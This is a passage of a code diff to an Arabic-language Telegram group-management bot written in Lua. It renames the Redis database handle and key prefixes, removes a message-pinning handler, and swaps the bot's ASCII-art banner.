+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',v) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",v) 
 end
 if data and data.code_ and data.code_ == 400 then
-database:srem("thsake:gog"..bot_id,v) 
-database:srem('MohaMeD:'..bot_id..'pro:groups',v) 
-database:srem( 'MohaMeD:'..bot_id.."groups",v) 
+datahmade:srem("MohaMeDe:gog"..bot_id,v) 
+datahmade:srem('MohaMeD:'..bot_id..'pro:groups',v) 
+datahmade:srem( 'MohaMeD:'..bot_id.."groups",v) 
 end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
-database:sadd("thsake:gog"..bot_id,v) 
-database:sadd( 'MohaMeD:'..bot_id.."groups",v) 
+datahmade:sadd("MohaMeDe:gog"..bot_id,v) 
+datahmade:sadd('MohaMeD:'..bot_id..'pro:groups',v) 
+datahmade:sadd( 'MohaMeD:'..bot_id.."groups",v) 
 print('\27[30;32m»» البوت ادمن في المجموعه \n\27[1;37m')
 end end,nil) end
 tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
 end
-if data.ID == "UpdateMessageSendSucceeded" then
-local msg = data.message_
-local text = msg.content_.text_
-local Get_Msg_Pin = database:get('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_)
-if Get_Msg_Pin ~= nil then
-if text == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_);end;end,nil)   
-elseif (msg.content_.sticker_) then 
-print(msg.content_.sticker_.sticker_.persistent_id_)
-if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_) end,nil)   
-end
-end
-if (msg.content_.voice_) then
-if msg.content_.voice_.voice_.persistent_id_ == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_) end,nil)   
-end
-end
-if (msg.content_.video_) then 
-if msg.content_.video_.video_.persistent_id_ == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_) end,nil)   
-end
-end
-if (msg.content_.animation_) then 
-if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_) end,nil)   
-end
-end
-if (msg.content_.document_) then
-if msg.content_.document_.document_.persistent_id_ == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_) end,nil)   
-end
-end
-if (msg.content_.photo_) then
-if msg.content_.photo_.sizes_[0] then
-id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
-end
-if msg.content_.photo_.sizes_[1] then
-id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
-end
-if msg.content_.photo_.sizes_[2] then
-id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
-end	
-if msg.content_.photo_.sizes_[3] then
-id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
-end
-if id_photo == Get_Msg_Pin then
-tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del('MohaMeD:'..bot_id..'Msg_Text'..msg.chat_id_) end,nil)   
-end
-end
-end
-end
 end
 --[[
- _____ ____  _   _    _    _  _______
-|_   _/ ___|| | | |  / \  | |/ / ____|
-  | | \___ \| |_| | / _ \ | ' /|  _|
-  | |  ___) |  _  |/ ___ \| . \| |___
-  |_| |____/|_| |_/_/   \_\_|\_\_____|
+ ____        _      _
+/ ___| _ __ (_) ___| |__  _ __
+\___ \| '_ \| |/ _ \ '_ \| '__|
+ ___) | | | | |  __/ |_) | |
+|____/|_| |_|_|\___|_.__/|_|
            CH > @MohaMeDTEAM
 --]]
